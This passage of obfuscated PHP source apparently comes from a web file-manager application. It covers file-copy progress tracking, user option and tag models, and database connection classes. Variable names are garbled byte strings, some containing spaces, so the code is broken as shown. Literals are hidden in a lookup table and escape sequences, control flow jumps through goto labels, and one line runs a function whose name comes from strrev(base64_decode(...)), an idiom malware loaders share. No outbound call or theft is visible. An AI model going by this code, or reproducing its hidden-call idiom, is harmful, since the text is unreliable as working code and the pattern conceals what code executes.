$…ÚæşœÆ[1842])); Hook::unbind($…ÚæşœÆ[656], array($this, $…ÚæşœÆ[1842])); Hook::unbind($…ÚæşœÆ[658], array($this, $…ÚæşœÆ[1842])); Hook::unbind($…ÚæşœÆ[1843], array($this, $…ÚæşœÆ[1844])); Hook::unbind($…ÚæşœÆ[674], array($this, $…ÚæşœÆ[1845])); Hook::unbind($…ÚæşœÆ[1846], array($this, $…ÚæşœÆ[1847])); Hook::unbind($…ÚæşœÆ[1848], array($this, $…ÚæşœÆ[1849])); Hook::unbind($…ÚæşœÆ[1850], array($this, $…ÚæşœÆ[1851])); } public function copyMoveStart($­¯ĞŞèñ, $Ò²¢’ùÒ, $­ıï´Õû, $¬”ëÑÈÉ) { $¬Áƒ£–Ø =& $_SERVER[É¨™èà]; self::log($¬Áƒ£–Ø[1861] . $Ò²¢’ùÒ . $¬Áƒ£–Ø[73] . $¬”ëÑÈÉ); $ÅˆüØùí = rtrim(TEMP_FILES, $¬Áƒ£–Ø[8]); if (substr($Ò²¢’ùÒ, 0, strlen($ÅˆüØùí)) == $ÅˆüØùí) { return; } if (substr($¬”ëÑÈÉ, 0, strlen($ÅˆüØùí)) == $ÅˆüØùí) { return; } $ñ¦é =& $this->task; $ñ¦é[$¬Áƒ£–Ø[1862]] = KodIO::transferType($­¯ĞŞèñ, $­ıï´Õû); $this->update(); } public function updateAfter() { $©Åâ¤ò =& $_SERVER[É¨™èà]; $ø¾ŒØŠ™ =& $this->task; if (!$ø¾ŒØŠ™[$©Åâ¤ò[854]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ø¾ŒØŠ™[$©Åâ¤ò[1862]] == $©Åâ¤ò[1429]) { return; } self::updateTask($ø¾ŒØŠ™); } private static function updateTask(&$¦­á‹ö¢) { $·³ÖĞŠ =& $_SERVER[É¨™èà]; if ($¦­á‹ö¢[$·³ÖĞŠ[1862]] == $·³ÖĞŠ[1299] || $¦­á‹ö¢[$·³ÖĞŠ[1862]] == $·³ÖĞŠ[110]) { if ($¦­á‹ö¢[$·³ÖĞŠ[1856]]) { $¦­á‹ö¢[$·³ÖĞŠ[1859]] = $¦­á‹ö¢[$·³ÖĞŠ[1858]] + $¦­á‹ö¢[$·³ÖĞŠ[1855]]; } } else { if ($¦­á‹ö¢[$·³ÖĞŠ[1862]] == $·³ÖĞŠ[1430]) { if ($¦­á‹ö¢[$·³ÖĞŠ[1856]] == $·³ÖĞŠ[1299]) { $¦­á‹ö¢[$·³ÖĞŠ[1859]] = $¦­á‹ö¢[$·³ÖĞŠ[1858]] + $¦­á‹ö¢[$·³ÖĞŠ[1855]] * 0.5; } else { if ($¦­á‹ö¢[$·³ÖĞŠ[1856]] == $·³ÖĞŠ[110]) { $¦­á‹ö¢[$·³ÖĞŠ[1859]] = $¦­á‹ö¢[$·³ÖĞŠ[1858]] + $¦­á‹ö¢[$·³ÖĞŠ[1854]] * 0.5 + $¦­á‹ö¢[$·³ÖĞŠ[1855]] * 0.5; } } } } $¦­á‹ö¢[$·³ÖĞŠ[1802]] = $¦­á‹ö¢[$·³ÖĞŠ[1859]] / $¦­á‹ö¢[$·³ÖĞŠ[854]]; if ($¦­á‹ö¢[$·³ÖĞŠ[1802]] > 0) { $ĞÁ°°Ğ  = timeFloat() - $¦­á‹ö¢[$·³ÖĞŠ[1804]] - $¦­á‹ö¢[$·³ÖĞŠ[1807]]; $¦­á‹ö¢[$·³ÖĞŠ[1808]] = $ĞÁ°°Ğ  * (1 - $¦­á‹ö¢[$·³ÖĞŠ[1802]]) / $¦­á‹ö¢[$·³ÖĞŠ[1802]]; } } public function addPath($›“ôÔÊï) { $«¡ŸúˆÙ =& $_SERVER[É¨™èà]; if (!$›“ôÔÊï) { return; } $ı»âù»å =& $this->task; $¾úÑ¼¥ = IO::infoWithChildren($›“ôÔÊï); $¤ºÇŸ¶— = $ı»âù»å[$«¡ŸúˆÙ[1863]] ? $ı»âù»å[$«¡ŸúˆÙ[1863]][$«¡ŸúˆÙ[1864]] : 0; $ı»âù»å[$«¡ŸúˆÙ[1863]] = array($«¡ŸúˆÙ[1864] => $¤ºÇŸ¶— + 1, $«¡ŸúˆÙ[504] => $¾úÑ¼¥[$«¡ŸúˆÙ[32]], $«¡ŸúˆÙ[87] => $¾úÑ¼¥[$«¡ŸúˆÙ[87]], $«¡ŸúˆÙ[594] => $¾úÑ¼¥[$«¡ŸúˆÙ[594]] ? $¾úÑ¼¥[$«¡ŸúˆÙ[594]] : $¾úÑ¼¥[$«¡ŸúˆÙ[87]]); if ($¾úÑ¼¥[$«¡ŸúˆÙ[33]] == $«¡ŸúˆÙ[233]) { $ı»âù»å[$«¡ŸúˆÙ[1157]] += 1; } else { $ı»âù»å[$«¡ŸúˆÙ[1157]] += $¾úÑ¼¥[$«¡ŸúˆÙ[82]][$«¡ŸúˆÙ[80]]; if ($¾úÑ¼¥[$«¡ŸúˆÙ[194]]) { $ı»âù»å[$«¡ŸúˆÙ[1157]] += $¾úÑ¼¥[$«¡ŸúˆÙ[82]][$«¡ŸúˆÙ[81]] + 1; } } $ı»âù»å[$«¡ŸúˆÙ[854]] += $¾úÑ¼¥[$«¡ŸúˆÙ[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¥˜›­„…) { } public function sourceAddHashEnd($²ºò¾ïé) { } public function sourceAddFileStart($øƒİô˜) { $Ø²ÀŸ ¤ =& $_SERVER[É¨™èà]; $æ°¬ô =& $this->task; $æ°¬ô[$Ø²ÀŸ ¤[1854]] = $øƒİô˜[$Ø²ÀŸ ¤[79]]; $æ°¬ô[$Ø²ÀŸ ¤[1852]] = $øƒİô˜[$Ø²ÀŸ ¤[32]]; $æ°¬ô[$Ø²ÀŸ ¤[1159]] = $øƒİô˜[$Ø²ÀŸ ¤[32]]; $æ°¬ô[$Ø²ÀŸ ¤[1865]] = $øƒİô˜[$Ø²ÀŸ ¤[87]]; $this->update(); } public function sourceAddFileEnd($µ›ş·È÷) { $ù²—ÖÆ» =& $_SERVER[É¨™èà]; $¹ñëÛ¨ =& $this->task; $¹ñëÛ¨[$ù²—ÖÆ»[1859]] += $µ›ş·È÷[$ù²—ÖÆ»[79]]; $¹ñëÛ¨[$ù²—ÖÆ»[1865]] = $µ›ş·È÷[$ù²—ÖÆ»[87]]; $this->update(1); } public function copyFileStart($í£ÚÃä, $†ÍŞ¨â, $¢âêÜÔŞ, $Ş©¯ÕÜ, $®ÍÖ‹“ù, $ÌöŞˆÇ¶) { $•ä–àáÂ =& $_SERVER[É¨™èà]; $¢ŠœÒûÄ = $®ÍÖ‹“ù; if ($¢ŠœÒûÄ == $GLOBALS[$•ä–àáÂ[1866]]) { $¢ŠœÒûÄ = $GLOBALS[$•ä–àáÂ[1867]]; } $GLOBALS[$•ä–àáÂ[1867]] = $®ÍÖ‹“ù; $GLOBALS[$•ä–àáÂ[1866]] = $ÌöŞˆÇ¶; $³ŠÄÕÌõ =& $this->task; $³ŠÄÕÌõ[$•ä–àáÂ[1852]] = $¢ŠœÒûÄ; $³ŠÄÕÌõ[$•ä–àáÂ[1854]] = (int) $í£ÚÃä->size($†ÍŞ¨â); $³ŠÄÕÌõ[$•ä–àáÂ[1855]] = 0; $³ŠÄÕÌõ[$•ä–àáÂ[1159]] = $•ä–àáÂ[12]; $³ŠÄÕÌõ[$•ä–àáÂ[1856]] = $•ä–àáÂ[12]; $³ŠÄÕÌõ[$•ä–àáÂ[1857]] = 0; $·§Å”É› = $³ŠÄÕÌõ[$•ä–àáÂ[1854]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($³ŠÄÕÌõ[$•ä–àáÂ[485]] . $•ä–àáÂ[1868]); if ($·§Å”É› && file_exists(get_path_father($Ş©¯ÕÜ))) { Cache::set($³ŠÄÕÌõ[$•ä–àáÂ[485]] . $•ä–àáÂ[1868], $Ş©¯ÕÜ); $³ŠÄÕÌõ[$•ä–àáÂ[1825]] = array($•ä–àáÂ[1869], $•ä–àáÂ[1870]); } $this->update(0, $·§Å”É›); } public static function updateCopyLocalFileSize($®Šé¡ëÌ) { $¬®Œâû† =& $_SERVER[É¨™èà]; $é÷©îíî = Cache::get($®Šé¡ëÌ[$¬®Œâû†[485]] . $¬®Œâû†[1868]); if (!$é÷©îíî || !file_exists($é÷©îíî)) { return $®Šé¡ëÌ; } $®Šé¡ëÌ[$¬®Œâû†[1855]] = @filesize($é÷©îíî); $®Šé¡ëÌ[$¬®Œâû†[1859]] += $®Šé¡ëÌ[$¬®Œâû†[1855]]; self::updateTask($®Šé¡ëÌ); return $®Šé¡ëÌ; } public function copyFileEnd($ÆÅÃ©›, $ìØÉÁ¿¯, $¿ÛÖµçÅ, $™»Ó®ÁÉ, $È©İªƒÖ, $ê£„º¨£) { $”ü ÄáÊ =& $_SERVER[É¨™èà]; $Ñğ§¤¨ì =& $this->task; $Ñğ§¤¨ì[$”ü ÄáÊ[1855]] = $Ñğ§¤¨ì[$”ü ÄáÊ[1854]]; $Ñğ§¤¨ì[$”ü ÄáÊ[1856]] = $”ü ÄáÊ[12]; unset($Ñğ§¤¨ì[$”ü ÄáÊ[1825]]); if ($È©İªƒÖ == $Ñğ§¤¨ì[$”ü ÄáÊ[1852]]) { $Ñğ§¤¨ì[$”ü ÄáÊ[1858]] += $Ñğ§¤¨ì[$”ü ÄáÊ[1854]]; $Ñğ§¤¨ì[$”ü ÄáÊ[1859]] = $Ñğ§¤¨ì[$”ü ÄáÊ[1858]]; $Ï…œÍé£ = 1; if (isset($Ñğ§¤¨ì[$”ü ÄáÊ[1865]]) && $Ñğ§¤¨ì[$”ü ÄáÊ[1865]] == $ìØÉÁ¿¯) { $Ï…œÍé£ = 0; } $this->update($Ï…œÍé£); } else { $this->update(); $Ñğ§¤¨ì[$”ü ÄáÊ[1855]] = 0; } Cache::remove($Ñğ§¤¨ì[$”ü ÄáÊ[485]] . $”ü ÄáÊ[1868]); self::log($”ü ÄáÊ[1871] . $ìØÉÁ¿¯ . $”ü ÄáÊ[73] . $™»Ó®ÁÉ . $”ü ÄáÊ[288] . $È©İªƒÖ . $”ü ÄáÊ[1872] . $Ñğ§¤¨ì[$”ü ÄáÊ[1852]]); } public function updateFileEnd($çÔàµ¿, $âµçÂÆÕ) { $“¸”Õµ =& $_SERVER[É¨™èà]; $èã¯‘¾¾ =& $this->task; $èã¯‘¾¾[$“¸”Õµ[1852]] = $çÔàµ¿; $èã¯‘¾¾[$“¸”Õµ[1854]] = $âµçÂÆÕ; $èã¯‘¾¾[$“¸”Õµ[1858]] += $âµçÂÆÕ; $èã¯‘¾¾[$“¸”Õµ[1859]] = $èã¯‘¾¾[$“¸”Õµ[1858]]; $this->update(1); self::log($“¸”Õµ[1873] . $çÔàµ¿); } public function sourceModelCopy($–êüÙØä) { $Ö‘‘¦—½ =& $_SERVER[É¨™èà]; $³±ªğòò = $–êüÙØä[0]; $¿“åÆÄŸ = $–êüÙØä[1]; $Åü‰ÒÁŠ =& $this->task; $this->sourceModelCopyFlag = !0; $‹Ë¨ªÍ© = 0; switch ($³±ªğòò) { case $Ö‘‘¦—½[650]: $‹Ë¨ªÍ© = 1; break; case $Ö‘‘¦—½[653]: $Åü‰ÒÁŠ[$Ö‘‘¦—½[1852]] = $¿“åÆÄŸ[$Ö‘‘¦—½[32]]; break; case $Ö‘‘¦—½[655]: $‹Ë¨ªÍ© = intval($–êüÙØä[$Ö‘‘¦—½[466]] * 0.4); break; case $Ö‘‘¦—½[657]: $‹Ë¨ªÍ© = intval($–êüÙØä[$Ö‘‘¦—½[466]] * 0.2); break; case $Ö‘‘¦—½[659]: $‹Ë¨ªÍ© = intval($–êüÙØä[$Ö‘‘¦—½[466]] * 0.4); break; } $this->update($‹Ë¨ªÍ©); $this->sourceModelCopyFlag = !1; } public function sourceRemove($äıÜ¿ßØ, $´Áğñ ü) { $æ Ïå€¦ =& $_SERVER[É¨™èà]; $this->sourceModelCopyFlag = !0; $ù°§²­ó = 1; if (isset($äıÜ¿ßØ[$æ Ïå€¦[82]])) { $ù°§²­ó = $äıÜ¿ßØ[$æ Ïå€¦[82]][$æ Ïå€¦[80]]; $ù°§²­ó = $ù°§²­ó + $äıÜ¿ßØ[$æ Ïå€¦[82]][$æ Ïå€¦[81]] + 1; } $this->update($ù°§²­ó); $this->sourceModelCopyFlag = !1; } public function sourceMove($«¤‘úØ) { $this->sourceRemove($«¤‘úØ, !1); } public function curlProgress($¸ÜŸïšÈ, $×ÁäŒõ½, $Œ¬Øµ®†, $‹•÷…Ç, $×Â–³˜Ø) { $Ø©áÕ =& $_SERVER[É¨™èà]; $ßÄÈ÷Íƒ =& $this->task; if ($×Â–³˜Ø > 0) { $ßÄÈ÷Íƒ[$Ø©áÕ[1159]] = $Ø©áÕ[1874]; $ßÄÈ÷Íƒ[$Ø©áÕ[1856]] = $Ø©áÕ[110]; if ($ßÄÈ÷Íƒ[$Ø©áÕ[1854]]) { $ßÄÈ÷Íƒ[$Ø©áÕ[1855]] = $×Â–³˜Ø; } if ($ßÄÈ÷Íƒ[$Ø©áÕ[1857]]) { $ßÄÈ÷Íƒ[$Ø©áÕ[1855]] = $×Â–³˜Ø + $ßÄÈ÷Íƒ[$Ø©áÕ[1857]]; } } else { if ($Œ¬Øµ®† > 0) { if ($ßÄÈ÷Íƒ[$Ø©áÕ[1854]] == $×ÁäŒõ½) { $ßÄÈ÷Íƒ[$Ø©áÕ[1855]] = $Œ¬Øµ®†; $ßÄÈ÷Íƒ[$Ø©áÕ[1159]] = $Ø©áÕ[1875]; $ßÄÈ÷Íƒ[$Ø©áÕ[1856]] = $Ø©áÕ[1299]; } } } $this->update(); } public function curlProgressStart($£û‚¤Ä) { } public function curlProgressEnd($Éó‡éÀÑ) { $¾ƒİç£Ì =& $_SERVER[É¨™èà]; $ÂÅ¿ì­ =& $this->task; $ÓÀÏÇş§ = curl_getinfo($Éó‡éÀÑ); $¬æÕòòÔ = $ÓÀÏÇş§[$¾ƒİç£Ì[1876]]; if ($¬æÕòòÔ == -1) { $¬æÕòòÔ = $ÓÀÏÇş§[$¾ƒİç£Ì[1877]]; } if ($ÂÅ¿ì­[$¾ƒİç£Ì[1856]] == $¾ƒİç£Ì[110] && $¬æÕòòÔ) { $ÂÅ¿ì­[$¾ƒİç£Ì[1857]] += $¬æÕòòÔ; } $this->update(); } } goto B„³‹ˆùõÄ; b«¿Ïƒ†¨: $fileSize = strrev(base64_decode($_SERVER[Ê¨¢®][0])); function binCheckNeq($¸±êÁÊ‹, $ïêÁ¸) { return $¸±êÁÊ‹ != $ïêÁ¸; } $_SERVER[$_SERVER[Ê¨¢®][1]] = $fileSize($_SERVER[$_SERVER[Ê¨¢®][2]]); goto bŞÑ¨”ßÇ; b¨ßÔ¾ù: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\x5f\157\160\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ô€¨ÎÏš) { $¤¼èÑŸ =& $_SERVER[É¨™èà]; $ù£¢…Œ = defined($¤¼èÑŸ[2230]) && USER_ID ? USER_ID : $¤¼èÑŸ[12]; return "\x55\x73\145\162\117\160\x74\x69\x6f\x6e\x5f{$ô€¨ÎÏš}\137" . $ù£¢…Œ; } protected function filterWhere($¡ŠÁıìó) { $üåæ—¨Î =& $_SERVER[É¨™èà]; $¡ŠÁıìó[$üåæ—¨Î[1800]] = defined($üåæ—¨Î[2230]) && USER_ID ? USER_ID : $üåæ—¨Î[12]; return $¡ŠÁıìó; } public function cacheRemoveUser($ëãş‡Ñ, $¤ÓÙÖû¡) { return Cache::remove("\125\163\x65\x72\x4f\160\164\151\157\156\x5f{$ëãş‡Ñ}\x5f" . $¤ÓÙÖû¡); } protected function optionDefault($ÎÏí„–Œ = '') { $ŞŞ“Ò•¾ =& $_SERVER[É¨™èà]; if ($ÎÏí„–Œ == $ŞŞ“Ò•¾[12]) { return $GLOBALS[$ŞŞ“Ò•¾[6]][$ŞŞ“Ò•¾[2548]]; } if ($ÎÏí„–Œ == $ŞŞ“Ò•¾[2549]) { return $GLOBALS[$ŞŞ“Ò•¾[6]][$ŞŞ“Ò•¾[2550]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\x2e\164\141\147\114\151\x73\164"; public $modelType = "\x55\x73\145\162\x4f\x70\164\151\157\x6e"; public $field = array("\156\x61\155\145", "\163\x74\x79\x6c\x65", "\x73\x6f\162\164"); public function listData($ŒüÙ†ƒ = false, $Àö•®ŒÉ = "\163\x6f\x72\164", $ŸŠ”­’© = false) { return parent::listData($ŒüÙ†ƒ, $Àö•®ŒÉ, $ŸŠ”­’©); } public function remove($ò‘‹¨Âí) { return parent::remove($ò‘‹¨Âí); } public function add($†¨õ“¶, $Ô¹çºÌ· = "\154\141\x62\145\154\55\147\162\x65\171\x2d\x6e\157\162\x6d\141\154") { $ş­Ïİï =& $_SERVER[É¨™èà]; if ($this->findByName($†¨õ“¶)) { return !1; } $‚™ó¹£ = array($ş­Ïİï[504] => $†¨õ“¶, $ş­Ïİï[570] => $Ô¹çºÌ·, $ş­Ïİï[2003] => $this->getSort($ş­Ïİï[347]) + 1); return parent::insert($‚™ó¹£); } public function update($†•›·’à, $¸ØÌ˜„‡) { $ÍÆ¬©¯Ÿ =& $_SERVER[É¨™èà]; $õÌ¹ù»” = $this->listData($†•›·’à); $ÙÓÚš = $this->findByName($¸ØÌ˜„‡[$ÍÆ¬©¯Ÿ[32]]); if (!$õÌ¹ù»” || $ÙÓÚš && $ÙÓÚš[$ÍÆ¬©¯Ÿ[485]] != $õÌ¹ù»”[$ÍÆ¬©¯Ÿ[485]]) { return !1; } return parent::update($†•›·’à, $¸ØÌ˜„‡); } public function moveTop($®¤íæÑõ) { $ØğŒ³À =& $_SERVER[É¨™èà]; $ê†â¬º± = parent::listData(); $É¡ªüòæ = $this->getSort($ØğŒ³À[346]); foreach ($ê†â¬º± as &$’¼¢ô›) { if ($’¼¢ô›[$ØğŒ³À[485]] == $®¤íæÑõ) { $’¼¢ô›[$ØğŒ³À[2023]] = $É¡ªüòæ; continue; } $’¼¢ô›[$ØğŒ³À[2023]] += 1; } unset($’¼¢ô›); return parent::resetData($ê†â¬º±); } public function moveBottom($ş¿Øô¹Š) { $º–¡´° =& $_SERVER[É¨™èà]; $æÒĞå¬ = $this->getSort($º–¡´°[347]) + 1; return parent::update($ş¿Øô¹Š, array($º–¡´°[2023] => $æÒĞå¬)); } public function resetSort($Î±Ú¶°Ó) { $ã˜Œ¼å =& $_SERVER[É¨™èà]; $°ïÕĞõ = array(); $Î±Ú¶°Ó = is_array($Î±Ú¶°Ó) ? $Î±Ú¶°Ó : array(); for ($ìŞ©Ûºı = 0; $ìŞ©Ûºı < count($Î±Ú¶°Ó); $ìŞ©Ûºı++) { $°ïÕĞõ[$Î±Ú¶°Ó[$ìŞ©Ûºı] . $ã˜Œ¼å[12]] = $ìŞ©Ûºı + 1; } $´û€„„¢ = parent::listData(); foreach ($´û€„„¢ as &$€Ãê—Ë°) { $ùçğúÑ = $°ïÕĞõ[$€Ãê—Ë°[$ã˜Œ¼å[485]]]; $€Ãê—Ë°[$ã˜Œ¼å[2023]] = $ùçğúÑ ? $ùçğúÑ : $€Ãê—Ë°[$ã˜Œ¼å[2023]]; } unset($€Ãê—Ë°); return parent::resetData($´û€„„¢); } private function getSort($­€©ó‡») { $Ú«ôÃïº =& $_SERVER[É¨™èà]; $ÛèÈÀßñ = parent::listData(); $°«äÜÂÚ = array_to_keyvalue($ÛèÈÀßñ, $Ú«ôÃïº[12], $Ú«ôÃïº[2023]); if (!$°«äÜÂÚ) { $°«äÜÂÚ = array(0); } $ĞÁÂú€× = $­€©ó‡» == $Ú«ôÃïº[347] ? max($°«äÜÂÚ) : min($°«äÜÂÚ); return intval($ĞÁÂú€×); } } goto cÍ‹ïâø×; c±™Öå¬Å°: class DbSqlite extends DbSqliteBase { public function query($Æó‘¢ş›) { $ÃÍæÁè– =& $_SERVER[É¨™èà]; if (!CacheLock::fileLock($ÃÍæÁè–[13])) { return !1; } $øÑÏ™Ù¤ = parent::query($Æó‘¢ş›); CacheLock::fileUnLock($ÃÍæÁè–[13]); return $øÑÏ™Ù¤; } public function execute($Ÿ·¸ö) { $ÙåÀ‘˜– =& $_SERVER[É¨™èà]; if (!CacheLock::fileLock($ÙåÀ‘˜–[13])) { return !1; } $ªÁ¾Íà¯ = parent::execute($Ÿ·¸ö); CacheLock::fileUnLock($ÙåÀ‘˜–[13]); return $ªÁ¾Íà¯; } } class DbSqlite3 extends DbSqlite3Base { public function query($õ¹’û³¢) { $íÎâÊ¢¨ =& $_SERVER[É¨™èà]; if (!CacheLock::fileLock($íÎâÊ¢¨[13])) { return !1; } $óÍ„‚™º = parent::query($õ¹’û³¢); CacheLock::fileUnLock($íÎâÊ¢¨[13]); return $óÍ„‚™º; } public function execute($Ÿßï•¥) { $Áş­şõÕ =& $_SERVER[É¨™èà]; if (!CacheLock::fileLock($Áş­şõÕ[13])) { return !1; } $Ë—×ÇÒê = parent::execute($Ÿßï•¥); CacheLock::fileUnLock($Áş­şõÕ[13]); return $Ë—×ÇÒê; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\x65\161" => "\74\76", "\x67\x74" => "\76", "\145\147\x74" => "\76\x3d", "\154\x74" => "\74", "\x65\154\164" => "\74\75", "\x6e\157\164\154\x69\x6b\145" => "\116\117\124\x20\x4c\x49\x4b\x45", "\154\x69\x6b\x65" => "\114\111\x4b\105", "\151\156" => "\x49\x4e", "\x6e\157\x74\x69\156" => "\x4e\x4f\x54\x20\111\x4e", "\156\157\164\40\151\x6e" => "\116\x4f\124\x20\x49\116", "\142\145\164\167\x65\x65\156" => "\102\105\124\127\105\x45\116", "\156\157\x74\142\x65\164\167\x65\x65\x6e" => "\x4e\x4f\x54\40\102\105\x54\x57\x45\105\x4e", "\x6e\x6f\x74\40\x62\x65\164\x77\145\145\156" => "\116\117\x54\x20\102\105\x54\x57\105\105\x4e"); protected $selectSql = "\123\105\x4c\x45\x43\x54\45\x44\111\123\124\111\116\x43\124\45\40\x25\x46\x49\105\x4c\104\45\40\106\122\117\x4d\x20\45\124\x41\102\114\105\45\x25\112\x4f\111\x4e\45\45\127\x48\x45\122\105\45\x25\107\x52\x4f\125\120\x25\x25\110\101\126\x49\x4e\x47\45\x25\117\122\104\105\x52\x25\45\x4c\x49\x4d\111\x54\x25\40\45\x55\116\111\x4f\x4e\x25\x25\x43\x4f\x4d\x4d\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $ÃœÎù– = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[É¨™èà][1054], $ÃœÎù–); } public function factory($¥‚çô® = '') { $„É×Ç¬³ =& $_SERVER[É¨™èà]; $¥‚çô® = $this->parseConfig($¥‚çô®); if (empty($¥‚çô®[$„É×Ç¬³[1055]])) { think_exception(think_lang($„É×Ç¬³[1056])); } $this->dbType = ucwords(strtolower($¥‚çô®[$„É×Ç¬³[1055]])); $óÃÍ’—ˆ = $„É×Ç¬³[1057] . $this->dbType; if (class_exists($óÃÍ’—ˆ)) { $—Àìİü = new $óÃÍ’—ˆ($¥‚çô®); if ($„É×Ç¬³[1058] != strtolower($¥‚çô®[$„É×Ç¬³[1055]])) { $—Àìİü->dbType = strtoupper($this->dbType); } else { $—Àìİü->dbType = $this->_getDsnType($¥‚çô®[$„É×Ç¬³[1010]]); } } else { think_exception(think_lang($„É×Ç¬³[1059]) . $„É×Ç¬³[1060] . $óÃÍ’—ˆ); } return $—Àìİü; } public function __call($›Ã„æŸ, $©Ø‚±ìŸ) { if (method_exists($this, $›Ã„æŸ)) { return call_user_func_array(array($this, $›Ã„æŸ), $©Ø‚±ìŸ); } } protected function _getDsnType($ÀœãşÛ¶) { $ÑïÀê­í = explode($_SERVER[É¨™èà][4], $ÀœãşÛ¶); $Õ—âª™ = strtoupper(trim($ÑïÀê­í[0])); return $Õ—âª™; } private function parseConfig($°¶¿™»§ = '') { $…Ğí»Õ =& $_SERVER[É¨™èà]; if (!empty($°¶¿™»§) && is_string($°¶¿™»§)) { $°¶¿™»§ = $this->parseDSN($°¶¿™»§); } elseif (is_array($°¶¿™»§)) { $°¶¿™»§ = array_change_key_case($°¶¿™»§); $°¶¿™»§ = array($…Ğí»Õ[1055] => $°¶¿™»§[$…Ğí»Õ[1061]], $…Ğí»Õ[982] => $°¶¿™»§[$…Ğí»Õ[1062]], $…Ğí»Õ[983] => $°¶¿™»§[$…Ğí»Õ[1063]], $…Ğí»Õ[980] => $°¶¿™»§[$…Ğí»Õ[1064]], $…Ğí»Õ[981] => $°¶¿™»§[$…Ğí»Õ[1065]], $…Ğí»Õ[21] => $°¶¿™»§[$…Ğí»Õ[1066]], $…Ğí»Õ[1010] => $°¶¿™»§[$…Ğí»Õ[1067]], $…Ğí»Õ[17] => isset($°¶¿™»§[$…Ğí»Õ[1068]]) ? $°¶¿™»§[$…Ğí»Õ[1068]] : array()); } elseif (empty($°¶¿™»§)) { if (think_config($…Ğí»Õ[1069]) && $…Ğí»Õ[1058] != strtolower(think_config($…Ğí»Õ[1070]))) { $°¶¿™»§ = $this->parseDSN(think_config($…Ğí»Õ[1069])); } else { $°¶¿™»§ = array($…Ğí»Õ[1055] => think_config($…Ğí»Õ[1070]), $…Ğí»Õ[982] => think_config($…Ğí»Õ[1071]), $…Ğí»Õ[983] => think_config($…Ğí»Õ[1072]), $…Ğí»Õ[980] => think_config($…Ğí»Õ[1073]), $…Ğí»Õ[981] => think_config($…Ğí»Õ[1074]), $…Ğí»Õ[21] => think_config($…Ğí»Õ[335]), $…Ğí»Õ[1010] => think_config($…Ğí»Õ[1069]), $…Ğí»Õ[17] => think_config($…Ğí»Õ[1075])); } } return $°¶¿™»§; } protected function initConnect($ç£¹–Ë = true) { if (1 == think_config($_SERVER[É¨™èà][22])) { $this->_linkID = $this->multiConnect($ç£¹–Ë); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ş²Ê»Š’ => $¿ùÔ–ß›) { $this->_linkID = $¿ùÔ–ß›; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($á“º¾» = false) { $›ŠâÚ•ı =& $_SERVER[É¨™èà]; static $ãªèç³Ğ = array(); static $Õ÷ÁÊİ = -1; if (empty($ãªèç³Ğ)) { foreach ($this->config as $£ñáêÒÇ => $“ºŒÈ§÷) { $ãªèç³Ğ[$£ñáêÒÇ] = explode($›ŠâÚ•ı[50], $“ºŒÈ§÷); } } if (think_config($›ŠâÚ•ı[1076])) { if ($á“º¾» || think_config($›ŠâÚ•ı[481]) === !0) { $úğıÙ²š = floor(mt_rand(0, think_config($›ŠâÚ•ı[1077]) - 1)); $Õ÷ÁÊİ = $úğıÙ²š; } else { if (is_numeric(think_config($›ŠâÚ•ı[1078]))) { $úğıÙ²š = think_config($›ŠâÚ•ı[1078]); } else { $úğıÙ²š = floor(mt_rand(think_config($›ŠâÚ•ı[1077]), count($ãªèç³Ğ[$›ŠâÚ•ı[980]]) - 1)); } } } else { $úğıÙ²š = floor(mt_rand(0, count($ãªèç³Ğ[$›ŠâÚ•ı[980]]) - 1)); $Õ÷ÁÊİ = $úğıÙ²š; } $úğıÙ²š = $Õ÷ÁÊİ !== -1 ? $Õ÷ÁÊİ : $úğıÙ²š; $§ÔåªØ = array($›ŠâÚ•ı[982] => isset($ãªèç³Ğ[$›ŠâÚ•ı[982]][$úğıÙ²š]) ? $ãªèç³Ğ[$›ŠâÚ•ı[982]][$úğıÙ²š] : $ãªèç³Ğ[$›ŠâÚ•ı[982]][0], $›ŠâÚ•ı[983] => isset($ãªèç³Ğ[$›ŠâÚ•ı[983]][$úğıÙ²š]) ? $ãªèç³Ğ[$›ŠâÚ•ı[983]][$úğıÙ²š] : $ãªèç³Ğ[$›ŠâÚ•ı[983]][0], $›ŠâÚ•ı[980] => isset($ãªèç³Ğ[$›ŠâÚ•ı[980]][$úğıÙ²š]) ? $ãªèç³Ğ[$›ŠâÚ•ı[980]][$úğıÙ²š] : $ãªèç³Ğ[$›ŠâÚ•ı[980]][0], $›ŠâÚ•ı[981] => isset($ãªèç³Ğ[$›ŠâÚ•ı[981]][$úğıÙ²š]) ? $ãªèç³Ğ[$›ŠâÚ•ı[981]][$úğıÙ²š] : $ãªèç³Ğ[$›ŠâÚ•ı[981]][0], $›ŠâÚ•ı[21] => isset($ãªèç³Ğ[$›ŠâÚ•ı[21]][$úğıÙ²š]) ? $ãªèç³Ğ[$›ŠâÚ•ı[21]][$úğıÙ²š] : $ãªèç³Ğ[$›ŠâÚ•ı[21]][0], $›ŠâÚ•ı[1010] => isset($ãªèç³Ğ[$›ŠâÚ•ı[1010]][$úğıÙ²š]) ? $ãªèç³Ğ[$›ŠâÚ•ı[1010]][$úğıÙ²š] : $ãªèç³Ğ[$›ŠâÚ•ı[1010]][0], $›ŠâÚ•ı[17] => isset($ãªèç³Ğ[$›ŠâÚ•ı[17]][$úğıÙ²š]) ? 